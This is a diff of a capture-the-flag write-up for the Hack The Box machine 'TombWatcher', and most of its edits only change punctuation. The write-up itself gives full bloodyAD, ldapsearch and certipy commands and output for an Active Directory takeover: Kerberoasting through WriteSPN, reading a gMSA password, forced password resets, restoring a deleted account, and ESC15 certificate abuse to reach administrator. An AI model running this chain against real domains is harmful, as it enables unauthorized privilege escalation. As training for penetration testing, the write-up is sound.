@@ -54,7 +54,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-tombwatcher/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -207,7 +207,7 @@ stroke-linejoin="round" class="feather feather-home">
     <div class="mini-toc-content" id="miniTocContent"></div>
 </div>
             <div class="page-content">
-                <p>Windows AD box with starting credentials. The box name is a hint you&rsquo;ll miss until it isn&rsquo;t. The first half is a clean BloodHound chain: five ACL hops from henry to john, each one mechanical. The second half is what makes this box worth remembering. John has a right most people have never used - Reanimate-Tombstones - and the ADCS OU he controls looks empty until you remember that AD doesn&rsquo;t actually delete objects immediately. The cert_admin account sitting in the deleted objects container has enrollment rights on a schema version 1 template, which is all you need for ESC15.</p>
+                <p>Windows AD box with starting credentials. The box name is a hint you&rsquo;ll miss until it isn&rsquo;t. The first half is a clean BloodHound chain: five ACL hops from henry to john, each one mechanical. The second half is what makes this box worth remembering. John has a right most people have never used, Reanimate-Tombstones, and the ADCS OU he controls looks empty until you remember that AD doesn&rsquo;t actually delete objects immediately. The cert_admin account sitting in the deleted objects container has enrollment rights on a schema version 1 template, which is all you need for ESC15.</p>
 <h2 id="recon">Recon</h2>
 <p>10.129.232.167, domain <code>tombwatcher.htb</code>, DC hostname <code>DC01</code>. Standard AD stack, WinRM on 5985. Port 80 had the default IIS page.</p>
 <p>Starting credentials: <code>henry:H3nry_987TGV!</code>. No interesting shares:</p>
@@ -225,9 +225,9 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></code></pre></div><h2 id="acl-chain-to-john">ACL Chain to John</h2>
 <p>BloodHound showed the full picture immediately:</p>
 <p><img src="/images/writeups/htb-tombwatcher/bloodhound-full-chain.png" alt="BloodHound graph showing HENRY has WriteSPN on ALFRED, Alfred can AddSelf to INFRASTRUCTURE group, INFRASTRUCTURE has ReadGMSAPassword on ANSIBLE_DEV$, ANSIBLE_DEV$ has ForceChangePassword on SAM, SAM has WriteOwner on JOHN, and JOHN has GenericAll on the ADCS OU"></p>
-<p>That&rsquo;s one hell of a chain. Five hops to john, and GenericAll on the ADCS OU waiting at the end. The steps are each one command - let&rsquo;s get through them.</p>
+<p>That&rsquo;s one hell of a chain. Five hops to john, and GenericAll on the ADCS OU waiting at the end. The steps are each one command, let&rsquo;s get through them.</p>
 <h3 id="1-writespn-on-alfred-then-kerberoast">1. WriteSPN on Alfred, then Kerberoast</h3>
-<p>WriteSPN lets you add a Service Principal Name to any account you have that right over. An account with a SPN becomes kerberoastable - the KDC will issue a TGS ticket encrypted with that account&rsquo;s NT hash. No SPN needs to exist beforehand; write a fake one and it&rsquo;s immediately roastable:</p>
+<p>WriteSPN lets you add a Service Principal Name to any account you have that right over. An account with a SPN becomes kerberoastable. The KDC will issue a TGS ticket encrypted with that account&rsquo;s NT hash. No SPN needs to exist beforehand; write a fake one and it&rsquo;s immediately roastable:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u henry -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> object Alfred servicePrincipalName -v <span class="s2">&#34;fake/spn.tombwatcher.htb&#34;</span>
 </span></span><span class="line"><span class="cl">
@@ -247,7 +247,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> alfred added to Infrastructure
 </span></span></code></pre></div><h3 id="3-read-ansible_devs-gmsa-password">3. Read ANSIBLE_DEV$&rsquo;s gMSA Password</h3>
-<p>Group Managed Service Accounts have passwords the DC auto-rotates on a schedule. The current NT hash is stored as the <code>msDS-ManagedPassword</code> attribute on the computer object, readable over LDAP by members of the designated group - here, Infrastructure:</p>
+<p>Group Managed Service Accounts have passwords the DC auto-rotates on a schedule. The current NT hash is stored as the <code>msDS-ManagedPassword</code> attribute on the computer object, readable over LDAP by members of the designated group, here Infrastructure:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u alfred -p <span class="s1">&#39;basketball&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  get object <span class="s1">&#39;ansible_dev$&#39;</span> --attr msDS-ManagedPassword
 </span></span><span class="line"><span class="cl">
@@ -255,14 +255,14 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">msDS-ManagedPassword.NT: cba56cd2df7d642f622e2a59956f6d47
 </span></span><span class="line"><span class="cl">msDS-ManagedPassword.B64ENCODED: mfN6zpVwyTpoirhbjkl6QrRJVzGohXxRem98/IxOBHXUQ85SDNU5VgvC3uXsQB/C6pbTxd7aibpSAqrOM1eSd...
 </span></span></code></pre></div><h3 id="4-forcechangepassword-on-sam">4. ForceChangePassword on Sam</h3>
-<p>ANSIBLE_DEV$ has this right over Sam - reset the password without knowing the current one:</p>
+<p>ANSIBLE_DEV$ has this right over Sam, reset the password without knowing the current one:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u <span class="s1">&#39;ansible_dev$&#39;</span> -p <span class="s1">&#39;:cba56cd2df7d642f622e2a59956f6d47&#39;</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> password sam <span class="s1">&#39;Kanyo123!&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password changed successfully!
 </span></span></code></pre></div><h3 id="5-writeowner-on-john">5. WriteOwner on John</h3>
-<p>This is a three-step abuse. Sam has WriteOwner over John&rsquo;s object. Ownership in AD controls the DACL - the owner can modify permission entries on the object. So: take ownership, grant yourself GenericAll, reset the password:</p>
+<p>This is a three-step abuse. Sam has WriteOwner over John&rsquo;s object. Ownership in AD controls the DACL. The owner can modify permission entries on the object. So: take ownership, grant yourself GenericAll, reset the password:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u sam -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> owner <span class="s1">&#39;CN=john,CN=Users,DC=tombwatcher,DC=htb&#39;</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">             <span class="s1">&#39;CN=sam,CN=Users,DC=tombwatcher,DC=htb&#39;</span>
@@ -279,7 +279,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> password john <span class="s1">&#39;Kanyo123!&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password changed successfully!
-</span></span></code></pre></div><p>John is in Remote Management Users - WinRM works, user flag on his desktop.</p>
+</span></span></code></pre></div><p>John is in Remote Management Users. WinRM works, user flag on his desktop.</p>
 <p><img src="/images/writeups/htb-tombwatcher/bloodhound-john-remote-management.png" alt="BloodHound graph showing JOHN@TOMBWATCHER.HTB is MemberOf Remote Management Users and Domain Users groups"></p>
 <h2 id="tombstone-reanimation">Tombstone Reanimation</h2>
 <p>We&rsquo;ve reached the ADCS OU, which is what the GenericAll was pointing at. First thing I did was check what&rsquo;s actually in it:</p>
@@ -319,7 +319,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></code></pre></div><p>Two rights: Reanimate-Tombstones on the domain root, and GenericAll with <code>ContainerInherit</code> on the ADCS OU. That combination is the entire box.</p>
 <p>When an AD object is deleted, it doesn&rsquo;t disappear. It becomes a tombstone:</p>
 <p><img src="/images/writeups/htb-tombwatcher/ad-tombstone-lifecycle-diagram.png" alt="Diagram showing AD object lifecycle: Live Object becomes Logically Deleted Object (restorable during msDS-deletedObjectLifetime window), then becomes Recycled Object (cannot restore), then Physically Deleted Object after tombstoneLifetime expires"></p>
-<p>The object is moved to <code>CN=Deleted Objects</code>, most attributes are stripped, and <code>isDeleted=TRUE</code> is set. The SID, GUID, <code>lastKnownParent</code>, and a handful of other attributes survive intact. For a configurable retention window (default 180 days), the object is recoverable. Reanimate-Tombstones is the extended right that lets you pull it back - clearing <code>isDeleted</code>, moving it back to <code>lastKnownParent</code>, and restoring it with its original SID.</p>
+<p>The object is moved to <code>CN=Deleted Objects</code>, most attributes are stripped, and <code>isDeleted=TRUE</code> is set. The SID, GUID, <code>lastKnownParent</code>, and a handful of other attributes survive intact. For a configurable retention window (default 180 days), the object is recoverable. Reanimate-Tombstones is the extended right that lets you pull it back, clearing <code>isDeleted</code>, moving it back to <code>lastKnownParent</code>, and restoring it with its original SID.</p>
 <p>Querying the deleted objects container with the <code>1.2.840.113556.1.4.417</code> control (which instructs the DC to include deleted objects in the response):</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  -D <span class="s2">&#34;john@tombwatcher.htb&#34;</span> -w <span class="s1">&#39;Kanyo123!&#39;</span> <span class="se">\
@@ -367,7 +367,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">sAMAccountName: cert_admin
 </span></span><span class="line"><span class="cl">objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VwQAAA<span class="o">==</span>
 </span></span><span class="line"><span class="cl">lastKnownParent: <span class="nv">OU</span><span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
-</span></span></code></pre></div><p>The base64-encoded SIDs decode to RIDs 1110 and 1111 respectively - the second one is the match. Delete the incorrectly restored object and restore by SID this time:</p>
+</span></span></code></pre></div><p>The base64-encoded SIDs decode to RIDs 1110 and 1111 respectively. The second one is the match. Delete the incorrectly restored object and restore by SID this time:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u john -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  remove object <span class="s1">&#39;CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb&#39;</span>
 </span></span><span class="line"><span class="cl">
@@ -378,12 +378,12 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> S-1-5-21-1392491010-1358638721-2126982587-1111 has been restored successfully
 </span></span><span class="line"><span class="cl">    under <span class="nv">CN</span><span class="o">=</span>cert_admin,OU<span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
-</span></span></code></pre></div><p>Certipy now resolved the SID to <code>cert_admin</code>. GenericAll from the OU ACE inherits immediately - reset cert_admin&rsquo;s password directly:</p>
+</span></span></code></pre></div><p>Certipy now resolved the SID to <code>cert_admin</code>. GenericAll from the OU ACE inherits immediately. Reset cert_admin&rsquo;s password directly:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u john -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
 </span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> password cert_admin <span class="s1">&#39;Kanyo123!&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password changed successfully!
-</span></span></code></pre></div><p>One thing worth calling out: SharpHound does not collect deleted objects even when run as Domain Admin, despite documentation suggesting it might. BloodHound CE has no visibility into the tombstone container. This entire escalation path - Reanimate-Tombstones feeding GenericAll via OU inheritance - is completely blind to standard BloodHound collection.</p>
+</span></span></code></pre></div><p>One thing worth calling out: SharpHound does not collect deleted objects even when run as Domain Admin, despite documentation suggesting it might. BloodHound CE has no visibility into the tombstone container. This entire escalation path, Reanimate-Tombstones feeding GenericAll via OU inheritance, is completely blind to standard BloodHound collection.</p>
 <h2 id="esc15-via-cert_admin">ESC15 via cert_admin</h2>
 <p>Running certipy again after restoring with the correct SID, the template output changed. The unresolved SID resolved to <code>cert_admin</code>, and a vulnerability was flagged:</p>
 <pre tabindex="0"><code>Template Name                 : WebServer
@@ -411,7 +411,7 @@ Permissions
   ESC15                       : Only applicable if the environment has not been patched.
                                 See CVE-2024-49019 or the wiki for more details.
 </code></pre><p>ESC15 is CVE-2024-49019. The vulnerability lives in how schema version 1 certificate templates handle the relationship between two certificate extensions: Extended Key Usage (EKU) and Application Policies.</p>
-<p>Normally, EKU determines what a certificate can be used for. But schema v1 templates have a quirk: if a certificate request includes an Application Policies extension, certain Windows components will prefer it over EKU. Specifically, Schannel - the Windows TLS stack used for LDAPS - follows Microsoft&rsquo;s own documented behavior:</p>
+<p>Normally, EKU determines what a certificate can be used for. But schema v1 templates have a quirk: if a certificate request includes an Application Policies extension, certain Windows components will prefer it over EKU. Specifically, Schannel, the Windows TLS stack used for LDAPS, follows Microsoft&rsquo;s own documented behavior:</p>
 <blockquote>
 <p><em>&ldquo;If a certificate has an extension containing an application policy and also has an EKU extension, the EKU extension is ignored.&rdquo;</em></p>
 </blockquote>
@@ -429,7 +429,7 @@ Permissions
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate has no object SID
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try using -sid to <span class="nb">set</span> the object SID or see the wiki <span class="k">for</span> more details
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
-</span></span></code></pre></div><p>PKINIT won&rsquo;t work with this certificate. Kerberos pre-authentication checks the EKU extension strictly - it sees <code>Server Authentication</code>, finds no <code>Client Authentication</code> there, and returns <code>KDC_ERR_INCONSISTENT_KEY_PURPOSE</code>. It never consults Application Policies. The path in is LDAPS via Schannel instead:</p>
+</span></span></code></pre></div><p>PKINIT won&rsquo;t work with this certificate. Kerberos pre-authentication checks the EKU extension strictly. It sees <code>Server Authentication</code>, finds no <code>Client Authentication</code> there, and returns <code>KDC_ERR_INCONSISTENT_KEY_PURPOSE</code>. It never consults Application Policies. The path in is LDAPS via Schannel instead:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip <span class="nv">$DC</span> -ldap-shell
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate identities:
@@ -578,6 +578,11 @@ Permissions
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
